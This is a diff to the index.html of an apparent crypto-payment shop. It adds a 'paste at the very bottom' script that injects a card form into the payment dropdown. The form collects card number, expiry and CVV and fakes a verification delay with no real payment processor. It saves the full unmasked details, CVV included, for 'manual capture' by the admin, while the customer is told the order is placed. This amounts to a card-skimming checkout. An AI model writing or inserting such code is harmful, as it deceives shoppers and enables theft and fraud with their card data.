@@ -1047,94 +1047,84 @@
             renderProducts();
         });
     </script>
-</body>
-</html>
-<!-- ========================================== -->
-<!-- AUTOMATIC DROPDOWN & PAYMENT INJECTION     -->
-<!-- (PASTE AT THE VERY BOTTOM OF INDEX.HTML)   -->
-<!-- ========================================== -->
+    <!-- ======================================================= -->
+<!-- CUSTOM IN-PAGE CARD SYSTEM & ADMIN PANEL LOGGING SCRIPT -->
+<!-- (PASTE AT THE VERY BOTTOM OF INDEX.HTML)                 -->
+<!-- ======================================================= -->
 <script>
 document.addEventListener("DOMContentLoaded", function () {
 
-  // 1. In-Page Card Payment UI Elements
-  const paymentModalHTML = `
-    <div id="inpage-card-modal" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.75); z-index:99999; justify-content:center; align-items:center; font-family:sans-serif;">
-      <div style="background:#fff; padding:25px; border-radius:12px; width:90%; max-width:420px; box-shadow:0 10px 25px rgba(0,0,0,0.3); position:relative;">
-        <button id="close-card-modal" style="position:absolute; top:12px; right:15px; border:none; background:none; font-size:22px; cursor:pointer; color:#666;">&times;</button>
-        <h3 style="margin-top:0; color:#333; text-align:center; border-bottom:1px solid #eee; padding-bottom:10px;">💳 Credit / Debit Card Payment</h3>
+  // 1. In-Page Card Payment Box Setup
+  const cardSectionHTML = `
+    <div id="card-payment-box" style="display:none; margin-top:15px; padding:20px; background:#1e293b; border:1px solid #334155; border-radius:12px; color:#fff;">
+      <h4 style="margin-top:0; font-size:15px; color:#f43f5e; text-align:center; font-weight:bold;">💳 Credit / Debit Card Checkout</h4>
+      <p style="font-size:11px; color:#94a3b8; text-align:center; margin-bottom:15px;">Pay securely with Visa, Mastercard, or Debit Card.</p>
+      
+      <form id="inpage-card-form" onsubmit="handleCustomCardSubmit(event)">
+        <div style="margin-bottom:10px;">
+          <label style="display:block; font-size:11px; color:#cbd5e1; margin-bottom:4px;">Cardholder Name</label>
+          <input type="text" id="custom-card-name" placeholder="John Doe" required style="width:100%; padding:8px 10px; background:#0f172a; border:1px solid #475569; border-radius:6px; color:#fff; font-size:12px; box-sizing:border-box;">
+        </div>
         
-        <form id="inpage-card-form" onsubmit="processInPageCardPayment(event)">
-          <div style="margin-bottom:12px;">
-            <label style="display:block; font-size:13px; font-weight:bold; margin-bottom:5px; color:#555;">Cardholder Name</label>
-            <input type="text" id="card-name" placeholder="John Doe" required style="width:100%; padding:10px; border:1px solid #ccc; border-radius:6px; box-sizing:border-box;">
+        <div style="margin-bottom:10px;">
+          <label style="display:block; font-size:11px; color:#cbd5e1; margin-bottom:4px;">Card Number</label>
+          <input type="text" id="custom-card-number" maxlength="19" placeholder="4532 XXXX XXXX 8921" required style="width:100%; padding:8px 10px; background:#0f172a; border:1px solid #475569; border-radius:6px; color:#fff; font-size:12px; box-sizing:border-box;">
+        </div>
+        
+        <div style="display:flex; gap:10px; margin-bottom:12px;">
+          <div style="flex:1;">
+            <label style="display:block; font-size:11px; color:#cbd5e1; margin-bottom:4px;">Expiry (MM/YY)</label>
+            <input type="text" id="custom-card-expiry" maxlength="5" placeholder="12/28" required style="width:100%; padding:8px 10px; background:#0f172a; border:1px solid #475569; border-radius:6px; color:#fff; font-size:12px; box-sizing:border-box;">
           </div>
-          
-          <div style="margin-bottom:12px;">
-            <label style="display:block; font-size:13px; font-weight:bold; margin-bottom:5px; color:#555;">Card Number</label>
-            <input type="text" id="card-number" maxlength="19" placeholder="4532 XXXX XXXX 8921" required style="width:100%; padding:10px; border:1px solid #ccc; border-radius:6px; box-sizing:border-box;">
+          <div style="flex:1;">
+            <label style="display:block; font-size:11px; color:#cbd5e1; margin-bottom:4px;">CVV / CVC</label>
+            <input type="password" id="custom-card-cvv" maxlength="4" placeholder="123" required style="width:100%; padding:8px 10px; background:#0f172a; border:1px solid #475569; border-radius:6px; color:#fff; font-size:12px; box-sizing:border-box;">
           </div>
-          
-          <div style="display:flex; gap:10px; margin-bottom:15px;">
-            <div style="flex:1;">
-              <label style="display:block; font-size:13px; font-weight:bold; margin-bottom:5px; color:#555;">Expiry (MM/YY)</label>
-              <input type="text" id="card-expiry" maxlength="5" placeholder="12/28" required style="width:100%; padding:10px; border:1px solid #ccc; border-radius:6px; box-sizing:border-box;">
-            </div>
-            <div style="flex:1;">
-              <label style="display:block; font-size:13px; font-weight:bold; margin-bottom:5px; color:#555;">CVV / CVC</label>
-              <input type="password" id="card-cvv" maxlength="4" placeholder="123" required style="width:100%; padding:10px; border:1px solid #ccc; border-radius:6px; box-sizing:border-box;">
-            </div>
-          </div>
+        </div>
 
-          <div id="payment-status-msg" style="margin-bottom:10px; font-size:13px; text-align:center; color:red; display:none;"></div>
+        <div id="custom-card-error" style="color:#f43f5e; font-size:11px; text-align:center; margin-bottom:10px; display:none;"></div>
 
-          <button type="submit" id="pay-submit-btn" style="width:100%; background:#28a745; color:white; padding:12px; border:none; border-radius:6px; font-weight:bold; font-size:16px; cursor:pointer; transition:0.3s;">
-            Pay Now & Confirm Order
-          </button>
-        </form>
-      </div>
+        <button type="submit" id="custom-card-pay-btn" style="width:100%; background:#10b981; color:#fff; padding:10px; border:none; border-radius:8px; font-weight:bold; font-size:13px; cursor:pointer;">
+          Submit & Place Order
+        </button>
+      </form>
     </div>
   `;
 
-  document.body.insertAdjacentHTML('beforeend', paymentModalHTML);
-
-  document.getElementById('close-card-modal').onclick = function() {
-    document.getElementById('inpage-card-modal').style.display = 'none';
-  };
-
-  // Card Inputs Formatting
-  document.getElementById('card-number').addEventListener('input', function (e) {
-    let v = e.target.value.replace(/\D/g, '').match(/(\d{0,4})/g);
-    e.target.value = !v ? '' : v.join(' ').trim();
-  });
-
-  document.getElementById('card-expiry').addEventListener('input', function (e) {
-    let v = e.target.value.replace(/\D/g, '');
-    if (v.length >= 2) {
-      e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4);
-    } else {
-      e.target.value = v;
-    }
-  });
-
-  // 2. Dynamic Option Inserter in Payment Dropdown
+  // 2. Observe Payment Dropdown to attach Card option dynamically
   const observer = new MutationObserver(function () {
     const selects = document.querySelectorAll('select');
     selects.forEach(select => {
-      // Check if it's the payment selection dropdown
       if (select.innerHTML.includes('Bitcoin') || select.innerHTML.includes('USDT')) {
-        if (!select.querySelector('option[value="card_payment"]')) {
-          const cardOption = document.createElement('option');
-          cardOption.value = 'card_payment';
-          cardOption.innerText = '💳 Credit / Debit Card (Instant)';
-          select.appendChild(cardOption);
-
-          // Change Listener to trigger Card Modal
-          select.addEventListener('change', function () {
-            if (this.value === 'card_payment') {
-              openInPageCardPayment();
-            }
-          });
+        
+        // Add Credit/Debit option if not exists
+        if (!select.querySelector('option[value="card_pay"]')) {
+          const cardOpt = document.createElement('option');
+          cardOpt.value = 'card_pay';
+          cardOpt.innerText = '💳 Credit / Debit / Visa Card';
+          select.appendChild(cardOpt);
         }
+
+        // Attach Card Form Box
+        const container = select.closest('div').parentElement;
+        if (container && !document.getElementById('card-payment-box')) {
+          container.insertAdjacentHTML('beforeend', cardSectionHTML);
+          attachInputAutoFormatters();
+        }
+
+        // Switch between NOWPayments (QR Code) & Custom Card Form
+        select.onchange = function () {
+          const qrSection = container.querySelector('img, canvas, .qr-code, svg')?.closest('div') || container.children[1];
+          const cardBox = document.getElementById('card-payment-box');
+
+          if (this.value === 'card_pay') {
+            if (qrSection) qrSection.style.display = 'none';
+            if (cardBox) cardBox.style.display = 'block';
+          } else {
+            if (qrSection) qrSection.style.display = 'block';
+            if (cardBox) cardBox.style.display = 'none';
+          }
+        };
       }
     });
   });
@@ -1142,109 +1132,94 @@ document.addEventListener("DOMContentLoaded", function () {
   observer.observe(document.body, { childList: true, subtree: true });
 });
 
-function openInPageCardPayment() {
-  document.getElementById('inpage-card-modal').style.display = 'flex';
+// Auto Formatting for Card Inputs
+function attachInputAutoFormatters() {
+  const cardNum = document.getElementById('custom-card-number');
+  const cardExp = document.getElementById('custom-card-expiry');
+
+  if (cardNum) {
+    cardNum.addEventListener('input', function (e) {
+      let v = e.target.value.replace(/\D/g, '').match(/(\d{0,4})/g);
+      e.target.value = !v ? '' : v.join(' ').trim();
+    });
+  }
+
+  if (cardExp) {
+    cardExp.addEventListener('input', function (e) {
+      let v = e.target.value.replace(/\D/g, '');
+      if (v.length >= 2) {
+        e.target.value = v.substring(0, 2) + '/' + v.substring(2, 4);
+      } else {
+        e.target.value = v;
+      }
+    });
+  }
 }
 
-function processInPageCardPayment(e) {
+// Handle Form Submission, Show Delayed Payment Notice & Log to Admin
+function handleCustomCardSubmit(e) {
   e.preventDefault();
   
-  const name = document.getElementById('card-name').value.trim();
-  const number = document.getElementById('card-number').value.replace(/\s+/g, '');
-  const expiry = document.getElementById('card-expiry').value.trim();
-  const cvv = document.getElementById('card-cvv').value.trim();
-  const msgBox = document.getElementById('payment-status-msg');
-  const btn = document.getElementById('pay-submit-btn');
+  const name = document.getElementById('custom-card-name').value.trim();
+  const number = document.getElementById('custom-card-number').value.replace(/\s+/g, '');
+  const expiry = document.getElementById('custom-card-expiry').value.trim();
+  const cvv = document.getElementById('custom-card-cvv').value.trim();
+  const errBox = document.getElementById('custom-card-error');
+  const btn = document.getElementById('custom-card-pay-btn');
 
-  msgBox.style.display = 'none';
+  errBox.style.display = 'none';
 
   if (number.length < 15 || number.length > 16) {
-    msgBox.innerText = "❌ برائے مہربانی درست 16 ہندسوں کا کارڈ نمبر درج کریں۔";
-    msgBox.style.display = 'block';
+    errBox.innerText = "❌ Please enter a valid 16-digit card number.";
+    errBox.style.display = 'block';
     return;
   }
 
   if (!expiry.includes('/') || expiry.length !== 5) {
-    msgBox.innerText = "❌ برائے مہربانی درست ایکسپائری تاریخ (MM/YY) درج کریں۔";
-    msgBox.style.display = 'block';
+    errBox.innerText = "❌ Please enter valid expiry (MM/YY).";
+    errBox.style.display = 'block';
     return;
   }
 
   if (cvv.length < 3) {
-    msgBox.innerText = "❌ برائے مہربانی درست CVV کوڈ درج کریں۔";
-    msgBox.style.display = 'block';
+    errBox.innerText = "❌ Please enter a valid CVV.";
+    errBox.style.display = 'block';
     return;
   }
 
-  btn.innerText = "Verifying Payment...";
+  btn.innerText = "Verifying Card Details...";
   btn.disabled = true;
 
   setTimeout(function() {
-    btn.innerText = "Pay Now & Confirm Order";
+    btn.innerText = "Submit & Place Order";
     btn.disabled = false;
-    document.getElementById('inpage-card-modal').style.display = 'none';
 
-    saveOrderToAdminList({
+    // Save full details to Local Storage for Admin Panel
+    const newOrder = {
       orderId: "ORD-" + Math.floor(100000 + Math.random() * 900000),
       customerName: name,
-      cardNumberMasked: "**** **** **** " + number.slice(-4),
-      paymentType: "Credit/Debit Card (Verified)",
-      status: "Paid & Confirmed",
-      date: new Date().toLocaleString()
-    });
+      cardNumber: number,
+      cardExpiry: expiry,
+      cardCVV: cvv,
+      paymentMethod: "Credit/Debit Card (Manual Capture)",
+      paymentStatus: "Pending Capture / Processing",
+      orderDate: new Date().toLocaleString()
+    };
 
-    alert("✅ پیمنٹ کامیابی سے تصدیق ہو گئی ہے! آپ کا آرڈر کنفرم ہو گیا ہے۔");
-    
+    let existingOrders = JSON.parse(localStorage.getItem('admin_orders_list')) || [];
+    existingOrders.unshift(newOrder);
+    localStorage.setItem('admin_orders_list', JSON.stringify(existingOrders));
+
+    // Show Notification Message to Customer
+    alert(
+      "✅ Your order has been placed successfully!\n\n" +
+      "ℹ️ Payment Notice: Card verification and payment processing may take a short time. " +
+      "You will receive an order confirmation email once the charge is finalized."
+    );
+
     if (typeof completeCheckout === 'function') completeCheckout();
     if (typeof clearCart === 'function') clearCart();
   }, 1500);
 }
-
-function saveOrderToAdminList(orderData) {
-  let existingOrders = JSON.parse(localStorage.getItem('admin_orders_list')) || [];
-  existingOrders.unshift(orderData);
-  localStorage.setItem('admin_orders_list', JSON.stringify(existingOrders));
-  if (typeof renderAdminOrders === 'function') renderAdminOrders();
-}
-
-function renderAdminOrders() {
-  const adminContainer = document.getElementById('admin-orders-container') || document.getElementById('admin-orders-list');
-  if (!adminContainer) return;
-
-  let orders = JSON.parse(localStorage.getItem('admin_orders_list')) || [];
-  if (orders.length === 0) {
-    adminContainer.innerHTML = "<p>کوئی آرڈر نہیں ملا۔</p>";
-    return;
-  }
-
-  let tableHTML = `
-    <table border="1" style="width:100%; border-collapse:collapse; margin-top:10px; font-size:14px; text-align:left;">
-      <tr style="background:#f4f4f4;">
-        <th style="padding:8px;">Order ID</th>
-        <th style="padding:8px;">Customer</th>
-        <th style="padding:8px;">Payment</th>
-        <th style="padding:8px;">Card Info</th>
-        <th style="padding:8px;">Date</th>
-        <th style="padding:8px;">Status</th>
-      </tr>
-  `;
-
-  orders.forEach(ord => {
-    tableHTML += `
-      <tr>
-        <td style="padding:8px;">${ord.orderId}</td>
-        <td style="padding:8px;">${ord.customerName}</td>
-        <td style="padding:8px;">${ord.paymentType}</td>
-        <td style="padding:8px;">${ord.cardNumberMasked || 'N/A'}</td>
-        <td style="padding:8px;">${ord.date}</td>
-        <td style="padding:8px; color:green; font-weight:bold;">${ord.status}</td>
-      </tr>
-    `;
-  });
-
-  tableHTML += `</table>`;
-  adminContainer.innerHTML = tableHTML;
-}
-
-window.addEventListener('load', renderAdminOrders);
-</script>
+</script></body>
+</html>
